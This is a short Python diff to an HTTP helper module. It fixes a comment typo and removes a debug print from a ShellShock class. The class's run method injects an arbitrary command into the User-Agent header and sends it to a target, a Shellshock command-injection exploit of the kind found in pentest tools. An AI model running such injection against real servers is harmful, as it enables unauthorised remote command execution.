@@ -19,7 +19,7 @@ class HTTP(object):
 
     Reste à implémenter: méthode POST
     """
-    # Defining rgex to parse content
+    # Defining regex to parse content
     RES_REGEX = re.compile(r"src\=(?:\"|')(?P<location>.*?)\.(?P<ext>\w+?)(?P<param>\?.*?)?(?:\"|')", re.IGNORECASE)
     FORM_REGEX = re.compile(r"<form(?P<form_param>.*?)>(?P<content>.*?)</form>", re.IGNORECASE | re.DOTALL)
     INPUT_REGEX = re.compile(r"<input(.*?)>", re.IGNORECASE | re.DOTALL)
@@ -341,5 +341,4 @@ class ShellShock(HTTP):
 
     def run(self, command):
         self.setHeader('User-Agent', ShellShock.USER_AGENT + command)
-        print ShellShock.USER_AGENT + command
         self.GET(self.target)
